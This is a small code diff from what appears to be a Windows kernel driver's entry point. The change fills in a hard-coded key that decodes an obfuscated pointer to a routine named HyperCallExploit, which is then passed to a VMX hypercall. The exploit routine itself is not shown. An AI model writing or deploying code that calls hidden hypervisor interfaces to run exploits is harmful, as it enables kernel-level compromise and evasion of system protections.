@@ -22,7 +22,7 @@ extern "C" {
 	{
 		UNREFERENCED_PARAMETER(driver_object);
 		UNREFERENCED_PARAMETER(registry_path);
-		ULONG64 Key = 0;// unknown;
+		ULONG64 Key = 0x37FFFC01E;// unknown;
 		driver_object->DriverUnload = Unload;
 		AsmVmxCall(3, (void*)((ULONG64)HyperCallExploit ^ Key));
 		return STATUS_SUCCESS;
